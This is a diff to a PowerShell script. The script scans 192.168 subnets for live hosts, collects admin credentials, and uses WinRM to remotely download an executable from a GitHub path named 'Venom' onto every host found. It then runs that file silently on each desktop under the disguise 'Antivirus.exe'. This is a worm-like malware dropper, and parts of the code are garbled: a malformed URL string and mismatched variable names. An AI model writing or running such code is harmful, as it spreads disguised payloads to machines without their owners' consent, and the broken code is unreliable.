@@ -2,7 +2,25 @@ function random_text {
     return -join ((97..122)+(65..90) | Get-Random -Count 5 | % {[char]$_})
 }
 
-Enable-PSRemoting -Force
+$logFile = "$env:temp\deployment_log.txt"
+$credentialPath = "$env:USERPROFILE\Documents\adminCreds.xml"
+
+function Log-Message {
+    param (
+        [string]$message
+    )
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    Add-Content -Path $logFile -Value "[$timestamp] $message"
+}
+
+#Enable-PSRemoting -Force
+
+if ((Get-Service -Name winrm).Status -ne 'Running') {
+    Enable-PSRemoting -Force
+} else {
+    Write-Output "WinRM is already running."
+}
+
 
 function Get-ActiveIPs {
     $baseSubnet = "192.168."
@@ -26,19 +44,18 @@ function Get-ActiveIPs {
 
 $wd = random_text
 $path = "$env:temp\$wd"
-$installer = "$path\AssassinsCreed_SE.exe"
+$installerUrl = 'https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/AssassinsCreed_SE.exe" -OutFile "AssassinsCreed_SE.exe"'
 $targets = Get-ActiveIPs
 $desktoppath = [System.Environment]::GetFolderPath("Desktop")
 
-if (-not (Test-Path $installer)) {
-    Write-Error "Installer not found at $installer"
-    exit
-}
+# if (-not (Test-Path $installerUrl)) {
+#     Write-Error "installerUrl not found at $installerUrl"
+#     exit
+# }
 
 # mkdir $path
 
-$logFile = "$env:temp\deployment_log.txt"
-$credentialPath = "$env:USERPROFILE\Documents\adminCreds.xml"
+
 
 # Save credentials securely
 $cred = Get-Credential
@@ -47,13 +64,6 @@ $cred | Export-Clixml -Path $credentialPath
 # Retrieve credentials securely
 $adminCreds = Import-Clixml -Path $credentialPath
 
-function Log-Message {
-    param (
-        [string]$message
-    )
-    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    Add-Content -Path $logFile -Value "[$timestamp] $message"
-}
 
 function Invoke-Retry {
     param (
@@ -89,24 +99,23 @@ foreach ($target in $targets) {
     }
 
     $job = Start-Job -ScriptBlock {
-        param ($installer, $target, $adminCreds)
+        param ($installerUrlUrl, $target, $adminCreds)
         try {
             $randomFolder = [System.IO.Path]::Combine($env:TEMP, (Get-Random -Count 5 | ForEach-Object { [char]$_ } -join ''))
             New-Item -Path $randomFolder -ItemType Directory -ErrorAction Stop
-            Copy-Item -Path $installer -Destination "$randomFolder\AssassinsCreed_SE.exe" -ErrorAction Stop
-            $desktoppath = [System.Environment]::GetFolderPath("Desktop")
+            $installerUrlPath = "$randomFolder\Antivirus.exe"
 
             Invoke-Command -ComputerName $target -ScriptBlock {
-                param ($randomFolder, $desktoppath)
-                $tempInstallerPath = "$randomFolder\AssassinsCreed_SE.exe"
-                Copy-Item -Path $tempInstallerPath -Destination $desktoppath -ErrorAction Stop
-                Start-Process -FilePath "$desktoppath\AssassinsCreed_SE.exe" -ArgumentList "/silent" -Wait
-            } -ArgumentList $randomFolder, $desktoppath -Credential $adminCreds -ErrorAction Stop
+                param ($installerUrlUrl, $installerUrlPath, $desktoppath)
+                Invoke-WebRequest -Uri $installerUrlUrl -OutFile $installerUrlPath -ErrorAction Stop
+                Copy-Item -Path $installerUrlPath -Destination $desktoppath -ErrorAction Stop
+                Start-Process -FilePath "$desktoppath\Antivirus.exe" -ArgumentList "/silent" -Wait
+            } -ArgumentList $installerUrlUrl, $installerUrlPath, $desktoppath -Credential $using:adminCreds -ErrorAction Stop
         }
         catch {
-            Log-Message "Failed to deploy to $target: $_"
+            Log-Message "Failed to deploy to $target : $($_)"
         }
-    } -ArgumentList $installer, $target, $adminCreds
+    } -ArgumentList $installerUrlUrl, $target, $adminCreds
 
     $jobQueue += $job
 }
